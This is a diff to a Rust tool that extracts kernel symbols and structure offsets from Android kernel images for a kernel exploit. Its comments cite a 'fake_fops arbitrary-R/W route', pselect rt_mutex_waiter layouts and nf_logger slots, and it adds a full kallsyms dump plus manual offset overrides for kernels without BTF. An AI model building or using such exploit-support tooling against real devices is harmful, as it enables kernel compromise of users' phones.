@@ -57,9 +57,24 @@ struct Cli {
     /// write output to a file instead of stdout
     #[arg(long)]
     out: Option<PathBuf>,
+    /// dump the FULL recovered kallsyms table (hex-addr + name, one per line).
+    /// Needed when the exploit must call arbitrary kernel functions (e.g. the
+    /// ashmem/configfs callbacks used by the fake_fops arbitrary-R/W route):
+    /// those symbols are not part of the curated SYMBOLS list that reaches
+    /// offsets.json.
+    #[arg(long)]
+    dump_symbols: Option<PathBuf>,
     /// skip disassembly-based derivation (pselect/loggers heuristics)
     #[arg(long)]
     no_disasm: bool,
+    /// rt_mutex_waiter.pi_tree_entry offset for pselect derivation on
+    /// BTF-less kernels (e.g. 0x18 for android12-5.10 compact waiter)
+    #[arg(long)]
+    derive_waiter_pi_tree: Option<u64>,
+    /// rt_mutex_waiter.deadline offset used as the second derivation
+    /// cross-validation field (e.g. 0x48 for android12-5.10)
+    #[arg(long)]
+    derive_waiter_deadline: Option<u64>,
     /// working directory for payload extraction and temp files; defaults to
     /// the system temp dir (pass an app-writable dir when running on Android)
     #[arg(long)]
@@ -229,6 +244,24 @@ fn run(cli: &Cli) -> Result<i32> {
         cli,
     )?;
     let symbols = ks.symbols;
+    // --dump-symbols: emit the complete recovered kallsyms table. The curated
+    // SYMBOLS list only covers what offsets.json needs; the arbitrary-R/W route
+    // additionally needs ashmem/configfs/noop_llseek style callbacks, which are
+    // only obtainable from here.
+    if let Some(path) = &cli.dump_symbols {
+        let mut buf = String::with_capacity(1 << 22);
+        let mut count = 0usize;
+        for (name, addrs) in &symbols {
+            for addr in addrs {
+                buf.push_str(&format!("{addr:016x} {name}\n"));
+                count += 1;
+            }
+        }
+        std::fs::write(path, buf).map_err(|err| {
+            ExtractError::new(format!("cannot write {}: {err}", path.display()))
+        })?;
+        eprintln!("info: dumped {count} kallsyms entries to {}", path.display());
+    }
     let text_base = kallsyms::unique(&symbols, "_text");
     let base = text_base.or_else(|| kallsyms::unique(&symbols, "_head"));
     let Some(base) = base else {
@@ -310,12 +343,41 @@ fn run(cli: &Cli) -> Result<i32> {
 
     let mut derived: BTreeMap<String, u64> = BTreeMap::new();
     if !cli.no_disasm {
-        if let Some(btf) = &btf {
+        // (pi_tree_entry, cross-validation field) for the waiter layout:
+        // from BTF when present, else from explicit CLI values (5.10).
+        let waiter_fields = match &btf {
+            Some(btf) => {
+                let pi = btf
+                    .field("rt_mutex_waiter", "pi_tree")
+                    .or_else(|| btf.field("rt_mutex_waiter", "pi_tree_entry"));
+                let xval = btf
+                    .field("rt_mutex_waiter", "wake_state")
+                    .or_else(|| btf.field("rt_mutex_waiter", "deadline"));
+                match (pi, xval) {
+                    (Some(a), Some(b)) => Some((a as u64, b as u64)),
+                    _ => None,
+                }
+            }
+            None => match (
+                cli.derive_waiter_pi_tree,
+                cli.derive_waiter_deadline,
+            ) {
+                (Some(a), Some(b)) => {
+                    eprintln!(
+                        "info: no BTF; using CLI waiter fields pi_tree={a:#x} \
+                         deadline={b:#x} for pselect derivation"
+                    );
+                    Some((a, b))
+                }
+                _ => None,
+            },
+        };
+        if let Some(waiter_fields) = waiter_fields {
             match derive_pselect_layout(
                 &boot.kernel,
                 &rel_symbols,
                 &sorted_offsets,
-                btf,
+                waiter_fields,
                 PSELECT_ROUTE_NFDS,
             ) {
                 Ok(layout) => {
@@ -354,20 +416,30 @@ fn run(cli: &Cli) -> Result<i32> {
                     eprintln!("warning: pselect_waiter_shift derivation failed: {err}");
                 }
             }
-            match derive_nf_logger_registration(&boot.kernel, &rel_symbols, &sorted_offsets, btf) {
-                Ok(info) => {
-                    derived.insert("off_slide_loggers_0_1".to_string(), info.loggers_0_1);
-                    eprintln!(
-                        "info: nf_logger loggers={:#x} nfulnl_logger={:#x} ulog={} slot={:#x}",
-                        info.loggers, info.nfulnl_logger, info.nf_log_type_ulog, info.loggers_0_1
-                    );
+            if let Some(btf) = btf.as_ref() {
+                match derive_nf_logger_registration(&boot.kernel, &rel_symbols, &sorted_offsets, btf)
+                {
+                    Ok(info) => {
+                        derived.insert("off_slide_loggers_0_1".to_string(), info.loggers_0_1);
+                        eprintln!(
+                            "info: nf_logger loggers={:#x} nfulnl_logger={:#x} ulog={} slot={:#x}",
+                            info.loggers, info.nfulnl_logger, info.nf_log_type_ulog, info.loggers_0_1
+                        );
+                    }
+                    Err(err) => {
+                        eprintln!("warning: loggers_0_1 derivation failed: {err}");
+                    }
                 }
-                Err(err) => {
-                    eprintln!("warning: loggers_0_1 derivation failed: {err}");
-                }
+            } else {
+                eprintln!(
+                    "warning: no BTF; loggers_0_1 falls back to the loggers+0x10 heuristic"
+                );
             }
         } else {
-            eprintln!("warning: no BTF; loggers_0_1 falls back to the loggers+0x10 heuristic");
+            eprintln!(
+                "warning: no waiter fields (no BTF and no --derive-waiter-*); \
+                 pselect_waiter_shift and loggers_0_1 fall back to heuristics"
+            );
         }
     } else {
         eprintln!(
